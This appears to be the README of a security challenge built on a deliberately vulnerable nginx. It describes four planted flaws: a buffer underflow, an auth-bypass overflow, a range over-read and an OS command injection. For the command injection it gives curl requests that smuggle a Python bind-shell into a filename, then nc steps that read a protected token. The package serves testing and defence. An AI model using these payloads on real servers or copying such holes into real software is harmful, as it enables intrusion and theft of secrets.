# justison

Justison is an injection vulnerability into nginx.

## Overview
Externality: nginx

Protocol: HTTP

Langage: C

## Building nginx

``./auto/configure --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_addition_module --with-http_xslt_module --with-http_image_filter_module --with-http_geoip_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_auth_request_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_slice_module --with-http_stub_status_module``
``make``

Copy the files under base_data
cp -R ./base_data/* /usr/local/nginx/

## Running nginx
sudo ./objs/nginx

## Protocol
nginx is a popular webserver that implements the HTTP protocol.

## In Scope
All core functionality and modules are in scope. Pages stored under ``/chess`` are assumed to require admin credentials to access.

## POV 1
CWE-124: Buffer Underflow
Memory Corruption, arbitrary write

By supplying a specially crafted HTTP request with a //../ it is possible to cause a buffer underflow. The parsing functionally will continually subtract 1 from the buffer start until it encounters a '/'. It will then begin writing
at that point which overwrites a pointer. This gives an attacker the ability for an arbitrary write of data.

To detect this crash you need to exec into the docker image and connect to the worker process via gdb. The reference PoV results in an attempt to write an attacker controlled value into an attacker controlled address. It is possible that PoVs exercising this vulnerability will result in different effects.

## POV 2
CWE-121: Stack-based Buffer Overflow
Memory corruption, authentication bypass

The challenge incorrectly allows an attacker to overwrite an entire struct instead of a specific field in the structure.
This allows for an authentication bypass. This error happens when handling the authentication realm in the ngx_http_auth_basic_set_realm()
function.

The reference PoV demonstrates this vulnerability by requesting a page requiring admin access without supplying proper credentials.

## POV 3
CWE-126: Buffer Over-read
Information Disclosure, private address
When using the Range filter, you can define a byte range that you want
returned in your request with the following header: Range: bytes=x-y. POV_3 leverages this feature, if you request a file and you define the y portion of the header value to a value that exceeds the size of the file you are requesting, you will be able to read data in memory from the buffer forward, and this results in an address leak.


## POV 4
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
Data / Command inject, Structured information disclosure.

An attacker is allowed to push files to the server. In addition, the server gives the ability to gzip files which it can
do internally or via a call to system(). If an attacker supplies a specific HTTP header then the challenge will call out
to gzip via system(). This can be done on an attacker supplied file name. A specially crafted filename will allow for a
command injection.

To manually execute this vulnerability
``dd if=/dev/random of=/tmp/stuff.dump bs=1 count=2000``

``curl -T /tmp/stuff.dump "localhost:8000/scratch/hello;python3%20-c%20%22import%20socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((str(),9998));s.listen(5);client,address=s.accept();import%20os;os.system(client.recv(1024));client.close();s.close();%22"``

``curl -H "Accept-Encoding: gzip" -H "Source: hello" "localhost:8000/scratch/hello;python3%20-c%20%22import%20socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((str(),9998));s.listen(5);client,address=s.accept();import%20os;os.system(client.recv(1024));client.close();s.close();%22"``

``nc localhost 9998``
``cat /token > /usr/local/nginx/html/scratch/token.html``

``curl localhost:8000/scratch/token.html``

The reference PoV returns the protected token.
